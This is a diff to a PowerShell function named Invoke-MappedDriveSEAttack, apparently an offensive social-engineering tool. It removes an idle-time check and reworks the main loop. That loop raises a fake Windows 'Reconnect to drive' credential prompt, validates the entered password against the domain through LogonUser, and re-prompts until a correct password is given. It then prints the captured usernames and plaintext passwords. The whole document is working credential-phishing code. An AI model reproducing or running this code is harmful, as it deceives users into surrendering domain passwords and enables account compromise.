@@ -42,50 +42,14 @@ Function Invoke-MappedDriveSEAttack
     #>
 
     $ErrorActionPreference = 'SilentlyContinue'
-    $error1 = 'User is not active. Exiting...'
-    $error2 = 'No mapped drives on host. Exiting...'
+   
+    $errorNoDrive = 'No mapped drives on host. Exiting...'
 
     
     $Source = @"
 
     using System;
-    using System.Runtime.InteropServices;
-
-    internal struct LASTINPUTINFO 
-    {
-        public uint cbSize;
-
-        public uint dwTime;
-    }
-
-    public class IdleTimeFinder
-    {
-        [DllImport("user32.dll")]
-        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
-
-        [DllImport("Kernel32.dll")]
-        private static extern uint GetLastError();
-
-        public static uint GetLastInputTime()
-        {
-            uint idleTime = 0;
-            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
-            lastInputInfo.cbSize = (uint)Marshal.SizeOf( lastInputInfo );
-            lastInputInfo.dwTime = 0;
-
-            uint envTicks = (uint)Environment.TickCount;
-
-            if ( GetLastInputInfo( ref lastInputInfo ) )
-            {
-            uint lastInputTick = lastInputInfo.dwTime;
-
-            idleTime = envTicks - lastInputTick;
-            }
-
-            return (( idleTime > 0 ) ? ( idleTime / 1000 ) : 0);
-        }
-    }
-
+    
     public class LoginClass 
     {
 
@@ -98,7 +62,6 @@ Function Invoke-MappedDriveSEAttack
     
     Add-Type -TypeDefinition $Source -PassThru -Language CSharp
 
-    $IdleTime = [IdleTimeFinder]::GetLastInputTime()
     function Error-BadCredentialsPrompt
     {
         $wshell = New-Object -ComObject Wscript.Shell
@@ -107,10 +70,11 @@ Function Invoke-MappedDriveSEAttack
 
     function Test-Credentials
     {
-        Param($username, $password,$domain)
+        Param($username,$password,$domain)
         [IntPtr]$userToken = [Security.Principal.WindowsIdentity]::GetCurrent().Token
    
         $valid = [LoginClass]::LogonUser( $username,$domain,$password, 2, 0, [ref]$userToken)
+
         if($valid)
         {
             return $true
@@ -125,72 +89,62 @@ Function Invoke-MappedDriveSEAttack
         $_.Used -gt 1kb -and $_.Name -ne 'C'
     }
 	
-    if($IdleTime -lt 1)
+
+    if($AvailableDrives -ne $null)
     {
-        if($AvailableDrives -ne $null)
-        {
-            $Drive = $AvailableDrives |
-            Select-Object -Property Root -ExpandProperty Root |
-            Get-Random -Count 1
+        $Drive = $AvailableDrives |
+        Select-Object -Property Root -ExpandProperty Root |
+        Get-Random -Count 1
 			
-            $ValidCreds = $false
-            $credentials = @()
-            Do
-            {
-                #$testCred = Steal-Credential -driveLetter $Drive
+        $ValidCreds = $false
+        $credentials = @()
+        Do
+        {
+            #$testCred = Steal-Credential -driveLetter $Drive
 				
-                $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
+            $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
 				
-                $UserDefDomain = $cred.GetNetworkCredential().Domain
-                $username = $cred.UserName
-                $password = $cred.GetNetworkCredential().Password
-                $CurrentDomain = $env:UserDomain
+            $UserDefDomain = $cred.GetNetworkCredential().Domain
+            $username = $cred.GetNetworkCredential().UserName
+            $password = $cred.GetNetworkCredential().Password
+            $CurrentDomain = $env:UserDomain
 				
                 
-                $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
+            $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
                 
 								
-                if($isValid -eq $false)
-                {
-                    $credentialsTemp = New-Object -TypeName psobject -Property @{
-                        Domain   = $CurrentDomain
-                        Username = $username
-                        Password = $password
-                        Valid    = $false
-                    }
-                    $credentials += $credentialsTemp
-                    $retry = Error-BadCredentialsPrompt
-                    if($retry -eq 2)
-                    {
-                        '## User exited erorr prompt without retry ##'
-                        break
-                    }
+            if($isValid -eq $false)
+            {
+                $credentialsTemp = New-Object -TypeName psobject -Property @{
+                    Domain   = $CurrentDomain
+                    Username = $username
+                    Password = $password
+                    Valid    = $false
                 }
-                else
+                $credentials += $credentialsTemp
+                $retry = Error-BadCredentialsPrompt
+                if($retry -eq 2)
                 {
-                    $credentialsTemp = New-Object -TypeName psobject -Property @{
-                        Domain   = $CurrentDomain
-                        Username = $username
-                        Password = $password
-                        Valid    = $true
-                    }
-                    $credentials += $credentialsTemp
-                    $ValidCreds = $true
+                    '## User exited erorr prompt without retry ##'
+                    break
                 }
             }
-            While($ValidCreds -eq $false)
-            '##Credentials##'
-            $credentials |
-            Select-Object -Property Domain, Username, Password, Valid |
-            Format-Table -AutoSize
+            else
+            {
+                $credentialsTemp = New-Object -TypeName psobject -Property @{
+                    Domain   = $CurrentDomain
+                    Username = $username
+                    Password = $password
+                    Valid    = $true
+                }
+                $credentials += $credentialsTemp
+                $ValidCreds = $true
+            }
         }
-        else
-        {
-            $error2
-        }
-    }
-    else
-    {
-        $error1
+        While($ValidCreds -eq $false)
+        '##Credentials##'
+        $credentials |
+        Select-Object -Property Domain, Username, Password, Valid |
+        Format-Table -AutoSize
     }
 }
